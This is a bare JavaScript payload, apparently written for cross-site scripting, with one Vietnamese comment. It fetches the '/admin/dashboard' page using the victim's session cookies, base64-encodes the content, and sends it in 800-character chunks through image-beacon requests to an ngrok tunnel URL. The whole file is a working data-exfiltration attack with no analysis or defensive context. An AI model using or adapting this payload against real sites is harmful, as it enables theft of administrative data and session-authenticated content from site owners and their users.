const url="https://30a8-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app";

new Image().src=url+"?note=start";

fetch('/admin/dashboard',{credentials:'include'})
.then(r=>r.text())
.then(d=>{

  let i=0;

  function sendChunk(){

    if(i>=d.length){
      new Image().src=url+"?note=end";
      return;
    }

    let chunk=d.slice(i,i+800);

    new Image().src=url+"?step="+i+"&data="+encodeURIComponent(btoa(chunk));

    i+=800;

    setTimeout(sendChunk,1000); // delay để tránh drop request
  }

  sendChunk();

});
